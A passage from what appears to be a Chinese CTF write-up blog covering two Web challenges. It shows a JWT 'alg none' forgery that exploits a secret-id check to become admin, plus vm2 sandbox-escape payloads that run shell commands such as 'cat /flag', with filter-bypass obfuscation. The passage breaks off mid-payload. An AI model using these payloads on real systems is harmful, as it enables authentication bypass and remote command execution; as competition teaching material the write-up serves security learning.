<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//app.js</span></span><br><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'koa-bodyparser'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'koa-session'</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> = <span class="built_in">require</span>(<span class="string">'koa-static'</span>);</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">'koa-views'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rest = <span class="built_in">require</span>(<span class="string">'./rest'</span>);</span><br><span class="line"><span class="keyword">const</span> controller = <span class="built_in">require</span>(<span class="string">'./controller'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">80</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line">app.keys = [crypto.randomBytes(<span class="number">16</span>).toString(<span class="string">'hex'</span>)];</span><br><span class="line">global.secrets = [];</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">static</span>(resolve(__dirname, <span class="string">'.'</span>)));</span><br><span class="line"></span><br><span class="line">app.use(views(resolve(__dirname, <span class="string">'./views'</span>), &#123;</span><br><span class="line">  extension: <span class="string">'pug'</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(session(&#123;<span class="attr">key</span>: <span class="string">'sses:aok'</span>, <span class="attr">maxAge</span>: <span class="number">86400000</span>&#125;, app));</span><br><span class="line"></span><br><span class="line"><span class="comment">// parse request body:</span></span><br><span class="line">app.use(bodyParser());</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare restful service</span></span><br><span class="line">app.use(rest.restify());</span><br><span class="line"></span><br><span class="line"><span class="comment">// add controllers:</span></span><br><span class="line">app.use(controller());</span><br><span class="line"></span><br><span class="line">app.listen(PORT);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`app started at port <span class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//controller.js</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addMapping</span>(<span class="params">router, mapping</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> url <span class="keyword">in</span> mapping) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.startsWith(<span class="string">'GET '</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> path = url.substring(<span class="number">4</span>);</span><br><span class="line">            router.get(path, mapping[url]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.startsWith(<span class="string">'POST '</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> path = url.substring(<span class="number">5</span>);</span><br><span class="line">            router.post(path, mapping[url]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`invalid URL: <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addControllers</span>(<span class="params">router, dir</span>) </span>&#123;</span><br><span class="line">    fs.readdirSync(__dirname + <span class="string">'/'</span> + dir).filter(<span class="function"><span class="params">f</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> f.endsWith(<span class="string">'.js'</span>);</span><br><span class="line">    &#125;).forEach(<span class="function"><span class="params">f</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> mapping = <span class="built_in">require</span>(__dirname + <span class="string">'/'</span> + dir + <span class="string">'/'</span> + f);</span><br><span class="line">        addMapping(router, mapping);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">dir</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> controllers_dir = dir || <span class="string">'controllers'</span>;</span><br><span class="line">    <span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">'koa-router'</span>)();</span><br><span class="line">    addControllers(router, controllers_dir);</span><br><span class="line">    <span class="keyword">return</span> router.routes();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//rest.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    APIError: <span class="function"><span class="keyword">function</span> (<span class="params">code, message</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code || <span class="string">'internal:unknown_error'</span>;</span><br><span class="line">        <span class="keyword">this</span>.message = message || <span class="string">''</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    restify: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> pathPrefix = <span class="string">'/api/'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (ctx.request.path.startsWith(pathPrefix)) &#123;</span><br><span class="line">                ctx.rest = <span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">                    ctx.response.type = <span class="string">'application/json'</span>;</span><br><span class="line">                    ctx.response.body = data;</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">await</span> next();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                    ctx.response.status = <span class="number">400</span>;</span><br><span class="line">                    ctx.response.type = <span class="string">'application/json'</span>;</span><br><span class="line">                    ctx.response.body = &#123;</span><br><span class="line">                        code: e.code || <span class="string">'internal_error'</span>,</span><br><span class="line">                        message: e.message || <span class="string">''</span></span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">await</span> next();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//controller/api.js</span></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">'../rest'</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">'POST /api/register'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'register error'</span>, <span class="string">'wrong username'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(global.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">'hex'</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    <span class="string">'POST /api/login'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'username or password is necessary'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/flag'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'permission error'</span>, <span class="string">'permission denied'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">'/flag'</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'GET /api/logout'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>有注册和登录的功能，</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419174209067.png" alt="image-20200419174209067"></p>
<p>不可以注册admin，随机生成密钥，并将密钥按序保存到全局secrets数组中，利用jwt.sign来生成secretid, username, password的token。</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419174551545.png" alt="image-20200419174551545"></p>
<p>登录时先获取secretid值，然后在全局的secrets里面获取密钥，之后利用jwt.verify()解密。</p>
<img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419175030662.png" alt="image-20200419175030662" style="zoom:150%;">

<p>并且只有username为admin时才能得到flag。</p>
<p>题目提示说：</p>
<img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419173928204.png" alt="image-20200419173928204" style="zoom:150%;">

<p>是依赖库有问题，然后看package.json</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419174014185.png" alt="image-20200419174014185"></p>
<p>然后从<a href="https://blog.csdn.net/a3320315/article/details/103092073" target="_blank" rel="noopener">这篇文章</a>里看到</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419175440994.png" alt="image-20200419175440994"></p>
<p>然后看本题登录时解token的密钥，</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419181915396.png" alt="image-20200419181915396"></p>
<p>首先是通过提取token中的secretid，然后判断sid是否合法。然后将取secrets[sid]作为jwt解密的密钥，若此处secret不存在，<code>jsonwebtoken</code>会采用<code>algorithm none</code>进行解密，然后我们就可以通过伪造jwt变成admin，然后就可以得到flag。</p>
<p>然后回溯sid，当sid能够满足<code>sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0</code>而且secriets[sid]为空，那么当sid为0.1能够满足，之后即可伪造admin。</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419193914408.png" alt="image-20200419193914408"></p>
<p>解题步骤：</p>
<ol>
<li><p>先得到非admin的jwt，利用jet.io解密。</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419193720626.png" alt="image-20200419193720626"></p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419194336137.png" alt="image-20200419194336137"></p>
</li>
<li><p>伪造jwt。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;</span><br><span class="line">  <span class="string">"secretid"</span>: <span class="number">0.1</span>,</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"password"</span>: <span class="string">"dddd"</span>,</span><br><span class="line">  <span class="string">"iat"</span>: <span class="number">1587324387</span></span><br><span class="line">&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>


</li>
</ol>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419195024687.png" alt="image-20200419195024687"></p>
<ol start="3">
<li><p>替换token登录。</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419195111379.png" alt="image-20200419195111379"></p>
</li>
<li><p>修改cookie，访问/api/flag。</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419195449455.png" alt="image-20200419195449455"></p>
</li>
</ol>
<blockquote>
<p>之后看来<a href="https://zhaoj.in" target="_blank" rel="noopener">赵总</a>的wp，他是用的将sid赋值为空数组，因为在javascript中，空数组与数字比较永远为真，下面是测试代码</p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200420163634128.png" alt="image-20200420163634128"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token = jwt.encode(&#123;</span><br><span class="line">  <span class="string">"secretid"</span>: [],</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"password"</span>: <span class="string">"dddd"</span>,</span><br><span class="line">  <span class="string">"iat"</span>: <span class="number">1587324387</span></span><br><span class="line">&#125;,algorithm=<span class="string">"none"</span>,key=<span class="string">""</span>).decode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">print(token)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200420164707008.png" alt="image-20200420164707008"></p>
</blockquote>
<h1 id="0x02-just-escape"><a href="#0x02-just-escape" class="headerlink" title="0x02 just_escape"></a>0x02 just_escape</h1><p>这题是一道nodejs沙箱题，改的之前一个国外比赛的题，加了限制，过滤了单引号、双引号和一些关键字(child_process、execSync、prototype、constructor、process)。</p>
<p>首先可以<a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">查到</a>，已经有表哥发了exp，然后就是对过滤的绕过了，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">""</span>)).a = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e.get_process(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		Buffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">			getOwnPropertyDescriptor()&#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;));</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先引号可以用反引号`来绕过，关键字通过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;</span><br></pre></td></tr></table></figure>

<img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419173554611.png" alt="image-20200419173554611" style="zoom:200%;">

<p>这样字符串拼接来绕过</p>
<p>payload：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return this.proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		Buffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">			getOwnPropertyDescriptor()&#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;));</span><br><span class="line">	&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>c`</span>&#125;</span>Sync`</span>](<span class="string">`whoami`</span>).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>官方payload:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="params">()</span>=&gt;</span>&#123; <span class="built_in">TypeError</span>[[<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`t`</span>,<span class="string">`y`</span>,<span class="string">`p`</span>,<span class="string">`e`</span>][<span class="string">`join`</span>](<span class="string">``</span>)][<span class="string">`a`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[[<span class="string">`c`</span>,<span class="string">`o`</span>,<span class="string">`n`</span>,<span class="string">`s`</span>,<span class="string">`t`</span>,<span class="string">`r`</span>,<span class="string">`u`</span>,<span class="string">`c`</span>,<span class="string">`t`</span>,<span class="string">`o`</span>,<span class="string">`r`</span>][<span class="string">`join`</span>](<span class="string">``</span>)]([<span class="string">`r`</span>,<span class="string">`e`</span>,<span class="string">`t`</span>,<span class="string">`u`</span>,<span class="string">`r`</span>,<span class="string">`n`</span>,<span class="string">` `</span>,<span class="string">`p`</span>,<span class="string">`r`</span>,<span class="string">`o`</span>,<span class="string">`c`</span>,<span class="string">`e`</span>,<span class="string">`s`</span>,<span class="string">`s`</span>][<span class="string">`join`</span>](<span class="string">``</span>))(); <span class="keyword">try</span>&#123; <span class="built_in">Object</span>[<span class="string">`preventExtensions`</span>](Buffer[<span class="string">`from`</span>](<span class="string">``</span>))[<span class="string">`a`</span>] = <span class="number">1</span>; &#125;<span class="keyword">catch</span>(e)&#123; <span class="keyword">return</span> e[<span class="string">`a`</span>](<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;)[<span 